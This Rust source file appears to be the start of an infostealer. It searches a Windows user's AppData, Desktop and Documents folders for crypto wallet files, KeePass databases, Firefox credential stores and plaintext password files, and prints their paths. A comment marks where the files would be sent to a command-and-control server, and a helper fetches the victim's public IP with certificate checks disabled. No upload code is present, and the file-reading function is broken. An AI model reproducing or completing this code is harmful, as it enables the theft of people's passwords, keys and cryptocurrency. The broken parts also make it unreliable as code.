use std::path::PathBuf;
use walkdir::WalkDir;
use tokio;

const MASKS: [&str; 13] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", "logins.json", "password.txt", "cert8.db", "key3.db"];

#[tokio::main]
async fn main() {
    let home = get_home_dir().to_str().unwrap().to_owned();
    let appdata = home.clone() + "\\AppData";
    let desktop = home.clone() + "\\Desktop";
    let documents = home.clone() + "\\Documents";
    walk_files(appdata);
    walk_files(desktop);
    walk_files(documents);
}

fn walk_files(path: String) {
    for entry in WalkDir::new(path)
        .follow_links(true)
        .into_iter()
        .filter_map(|e| e.ok()) {
        let f_name = entry.file_name().to_string_lossy();
        if is_important_file(f_name.as_ref()) {
            println!("{}", entry.path().to_str().unwrap().clone().to_owned() );
            //send files to C2 or something
        }
    }
}

fn is_important_file(file_name: &str) -> bool {
    MASKS
        .iter()
        .any(|&suffix| file_name.contains(suffix))
}

fn get_home_dir() -> PathBuf {
    return dirs::home_dir().unwrap();
}

fn fetch_ip() -> String {
    let client = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    if let Ok(resp) = client.get("https://ifconfig.me/ip").send() {
        return resp.text().unwrap();
    } else {
        return "0.0.0.0".to_string();
    }
}

fn read_file_vec(filepath: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let data = tokio::io::AsyncRead(filepath)?;
    Ok(data)
}
